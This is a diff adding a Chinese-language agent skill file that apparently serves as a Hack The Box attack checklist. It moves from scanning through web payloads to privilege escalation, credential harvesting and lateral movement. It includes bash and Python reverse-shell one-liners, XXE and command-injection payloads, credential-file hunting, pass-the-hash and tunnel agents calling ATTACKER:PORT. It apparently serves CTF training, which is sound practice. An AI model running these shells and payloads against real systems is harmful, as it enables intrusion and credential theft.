@@ -1,0 +1,252 @@
+---
+name: 'htb-master-checklist'
+description: 'HTB 综合攻击检查表：整合全部28条记忆，按6阶段组织。每步引用对应详细记忆'
+metadata: { domain: meta, tier: T1 }
+---
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
+# HTB 综合攻击检查表
+
+> 整合 28 条记忆、~360 台机器攻击链。每阶段引用对应的详细记忆。
+
+---
+
+## 阶段 0：初始侦察
+
+### 0.1 端口扫描
+```bash
+nmap -p- --min-rate 10000 -sV -sC -oA nmap/all <IP>
+sudo nmap -sU --top-ports 20 -oA nmap/udp <IP>
+```
+
+### 0.2 OS 判定 → 题型预判
+```
+[ ] Windows Server 2025 → box-type-recognition 先看 dMSA/KDS
+[ ] Windows Server 2016-2022 → windows-ad-checklist 先看 ADCS/Shadow Credentials
+[ ] Linux 5.10-6.13 → linux-privesc-checklist 先看 Copy Fail/Dirty Frag
+[ ] Linux 其他 → linux-privesc-checklist 9 阶段
+```
+
+### 0.3 题型信号速查
+| 信号 | 题型 | 记忆 |
+|------|------|------|
+| KDS Root Key 存在 | BadSuccessor/BetterSuccessor | box-type-recognition |
+| NTLM 全失败，Kerberos 成功 | Kerberos-Only AD | kerberos-only-ad |
+| 多域 `nltest /domain_trusts` | 跨林攻击 | kerberos-only-ad |
+| .vmem/.vmdk/.vhd 文件 | VM 取证 | windows-ad-checklist#6 |
+| MSSQL 端口 1433/1434 | MSSQL 攻击链 | mssql-attack-chain |
+| ADCS HTTP 端点 | ESC1-16 | adcs-attack-chain |
+| Web 登录页面 | CMS RCE / SSTI / SQLi | cms-framework-rce |
+| `.git/` 目录暴露 | Git 历史泄露 | web-chained-attacks |
+| localhost:25151 (Cobbler) | CVE-2024-47533 | web-chained-attacks |
+
+---
+
+## 阶段 1：Web 攻击（如有 HTTP/HTTPS）
+
+### 1.1 枚举
+```bash
+# 目录爆破
+gobuster dir -u http://target -w raft-medium-directories.txt -x php,asp,aspx,jsp,txt,bak
+
+# Vhost 发现
+ffuf -u http://target -H "Host: FUZZ.target" -w subdomains.txt
+
+# CMS 识别
+whatweb http://target
+```
+
+### 1.2 Web 漏洞速查
+| 漏洞类型 | 速查记忆 | 快速测试 |
+|---------|---------|---------|
+| SQL Injection | mssql-attack-chain / web-payloads-reference | `' OR 1=1--` |
+| NoSQL Injection | web-payloads-reference#5 | `{"$ne": null}` |
+| SSTI | web-payloads-reference#1 | `{{7*7}}` |
+| XSS | web-payloads-reference / XSS 章节 | `<img src=x onerror=alert(1)>` |
+| SSRF | web-payloads-reference / SSRF 章节 | `http://127.0.0.1:PORT` |
+| XXE | web-payloads-reference#2 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
+| LFI | web-payloads-reference#6 | `../../../../etc/passwd` |
+| Command Injection | web-payloads-reference#7 | `; id` `\|id` `\`id\`` `$(id)` |
+| Deserialization | deserialization-attacks | 检查 ac ed 00 05 / rO0AB / gAS |
+| Cypher Injection | web-chained-attacks | `'}) RETURN w UNION MATCH ...` |
+| H2 Java Alias | h2-java-alias-rce | JDBC URL: `INIT=CREATE ALIAS` |
+| Python Sandbox | python-sandbox-escape | `().__class__.__mro__[-1].__subclasses__()` |
+
+### 1.3 CMS 快速攻击
+| CMS | 快速命令 | 记忆 |
+|-----|---------|------|
+| WordPress | `wpscan --url http://target -e ap,at,u` | cms-framework-rce |
+| Joomla | API 泄露: `/api/index.php/v1/config/application?public=true` | cms-framework-rce |
+| Drupal | CVE-2018-7600 PoC | cms-framework-rce |
+| Magento | SQLi → admin → Froghopper | cms-framework-rce |
+| Apache NiFi | `/nifi` → DBCPConnectionPool → H2 Alias | h2-java-alias-rce |
+| Mirth Connect | CVE-2023-43208 XStream deser | web-chained-attacks |
+| Grafana | CVE-2021-43798 path traversal / CVE-2024-9264 | cms-framework-rce |
+
+---
+
+## 阶段 2：拿 Shell
+
+### 2.1 反弹 Shell 模板
+```bash
+# Linux
+bash -i >& /dev/tcp/IP/PORT 0>&1
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")'
+
+# Windows (PowerShell)
+powershell -e <base64_encoded_reverse_shell>
+```
+
+### 2.2 获 shell 后立即执行
+```bash
+[ ] id; whoami; hostname; ip a
+[ ] sudo -l 2>/dev/null                   # 🔴 第一优先！
+[ ] find / -perm -4000 -ls 2>/dev/null    # SUID
+[ ] getcap -r / 2>/dev/null               # Capabilities
+[ ] ls -la /etc/cron*; crontab -l; systemctl list-timers  # cron-privesc-patterns
+[ ] ss -ltnp | grep 127.0.0.1             # localhost 服务
+[ ] find / -name ".git" -type d 2>/dev/null
+[ ] find / -name "*.conf" -o -name "*.properties" -o -name "*.env" 2>/dev/null
+[ ] ls -la /opt/; ls -la /var/www/
+[ ] find / -name "user.txt" -o -name "root.txt" 2>/dev/null  # 🚨 先搜 flag！
+```
+
+---
+
+## 阶段 3：Linux 提权
+
+### 3.1 快速优先级（按成功率排序）
+| 优先级 | 检查项 | 记忆 |
+|--------|--------|------|
+| 🔴 1 | `sudo -l` → GTFOBins 对照 | sudo-escape-techniques |
+| 🔴 2 | Cron jobs → 可写脚本/PATH/通配符 | cron-privesc-patterns |
+| 🔴 3 | SUID 二进制 → GTFOBins | linux-privesc-checklist |
+| 🔴 4 | Docker group → 容器逃逸 | linux-privesc-checklist |
+| 🔴 5 | Capabilities → cap_setuid 等 | linux-privesc-checklist |
+| 🟠 6 | writable /etc/passwd, /etc/shadow | `ls -la /etc/passwd /etc/shadow` |
+| 🟠 7 | sudo 版本 CVE | `sudo --version` |
+| 🟠 8 | localhost root 服务 → eval/exec 注入 | web-chained-attacks |
+| 🟡 9 | Kernel exploit (最后) | searchsploit kernel |
+
+### 3.2 Sudo Escape 一键对照
+→ 详见 sudo-escape-techniques 完整矩阵（40+ 命令）
+
+### 3.3 Cron Abuse 一键检查
+→ 详见 cron-privesc-patterns 5 种模式
+
+---
+
+## 阶段 4：Windows / AD 提权
+
+### 4.1 题型判定（🔴 第一步）
+→ 详见 box-type-recognition + windows-ad-checklist#0
+
+```bash
+[ ] systeminfo → OS Build (26100 = Server 2025)
+[ ] nltest /domain_trusts → 跨林？
+```
+
+### 4.2 提权优先级
+| 优先级 | 检查项 | 条件 |
+|--------|--------|------|
+| 🔴 1 | BetterSuccessor | KDS + CreateChild + GenericWrite |
+| 🔴 2 | Shadow Credentials | GenericWrite on target |
+| 🔴 3 | ADCS ESC1-16 | certipy find -vulnerable |
+| 🔴 4 | RBCD + S4U | PetitPotam + relay |
+| 🔴 5 | Kerberoast/ASREP | 仅当上面不通 |
+| 🔴 6 | SeImpersonate → Potato | whoami /priv |
+| 🔴 7 | SeBackup → SAM dump | whoami /priv |
+
+### 4.3 AD 攻击链速查
+```bash
+# 域枚举
+nxc smb DC -u '' -p '' --rid-brute      # 用户枚举
+nxc smb DC -u user -p pass --shares     # 共享
+bloodhound-python -d domain -u user -p pass -c All
+
+# Kerberos-Only 环境 → kerberos-only-ad
+# ALL commands need: -k -no-pass [-aesKey <key>]
+# Clock sync: ntpdate -bu <DC_IP> before every operation
+
+# MSSQL → mssql-attack-chain
+# ADCS → adcs-attack-chain
+```
+
+---
+
+## 阶段 5：凭据收集
+
+### 5.1 哈希类型速查
+| 格式 | 类型 | hashcat -m |
+|------|------|-----------|
+| `$2a$` / `$2b$` / `$2y$` | bcrypt | 3200 |
+| `$6$` | sha512crypt | 1800 |
+| `pbkdf2:sha256:N$salt$hash` | Werkzeug | 10900 |
+| `$krb5tgs$23$` | Kerberoast | 13100 |
+| `$krb5asrep$23$` | AS-REP | 18200 |
+| `$P$` / `$H$` | phpBB/WordPress | 400 |
+| `sha256$` / `sha1$` | Django/Flask | vary |
+| 32 hex (全大写) | NTLM | 1000 |
+| WPA2 handshake (.22000) | WPA2 | 22000 |
+
+### 5.2 常见凭据源
+```
+[ ] ConsoleHost_history.txt (PowerShell)
+[ ] .git/config, .git-credentials
+[ ] *.conf, *.properties, *.env, *.ini, *.xml
+[ ] sysprep.xml, unattend.xml
+[ ] /opt/*/conf/, /var/www/*/config/
+[ ] SAM/SYSTEM hive → secretsdump
+[ ] DPAPI → LaZagne
+[ ] LAPS → reg query AdmPwd
+[ ] mRemoteNG confCons.xml
+[ ] Firefox logins.json, Chrome Login Data
+[ ] KeePass .kdbx → keepass2john
+[ ] SQLite/MySQL DB → dump
+```
+
+---
+
+## 阶段 6：横向移动
+
+```
+[ ] WinRM: evil-winrm -i TARGET -u user -p pass
+[ ] PsExec: impacket-psexec domain/user:pass@TARGET
+[ ] WMI: impacket-wmiexec domain/user:pass@TARGET
+[ ] SMBExec: impacket-smbexec domain/user:pass@TARGET
+[ ] PTH: evil-winrm -i TARGET -u user -H <NT_HASH>
+[ ] Kerberos: impacket-psexec -k -no-pass domain/user@TARGET
+[ ] RDP: xfreerdp /v:TARGET /u:user /p:pass /cert:ignore
+[ ] SSH tunnel: ssh -D 1080 user@target → proxychains
+[ ] Ligolo-ng: /tmp/agent -connect ATTACKER:PORT -ignore-cert
+[ ] chisel: ./chisel client ATTACKER:PORT R:socks
+```
+
+---
+
+## 记忆速查索引
+
+| 类别 | 记忆 | 内容 |
+|------|------|------|
+| **总览** | box-type-recognition | OS→题型判定树 |
+| | windows-ad-checklist | Windows/AD 全阶段 |
+| | linux-privesc-checklist | Linux 提权 9 阶段 |
+| **Web** | web-payloads-reference | SSTI/XXE/SQLi/LFI 等 payload |
+| | cms-framework-rce | 25+ CMS CVE 速查 |
+| | web-chained-attacks | 多阶段链式攻击模式 |
+| | python-sandbox-escape | Python 沙箱逃逸 |
+| **注入** | mssql-attack-chain | MSSQL 全攻击面 |
+| | h2-java-alias-rce | H2 JDBC → Java RCE |
+| | deserialization-attacks | 7 语言反序列化 |
+| **AD** | adcs-attack-chain | ADCS ESC1-16 |
+| | kerberos-only-ad | No-NTLM/AES256 范式 |
+| | ntlm-relay-chain | NTLM Relay + Coercion |
+| **提权** | sudo-escape-techniques | 40+ sudo 命令逃逸 |
+| | cron-privesc-patterns | 5 种 cron 提权模式 |
+| **技巧** | file-transfer-techniques | 各 OS 文件传输 |
+| | tunneling-port-forwarding | 隧道/端口转发 |
+| | deinteractive-credentials | 凭据去交互化 |
+| **实战** | htb-methodology | 打靶强制检查表 |
+| | htb-workflow-with-本地 bash | 本地 bash 工作流 |
+| | reasoning-antipatterns | 推理反模式避坑 |
+| | debug-5whys | 卡住时 5 Whys 框架 |
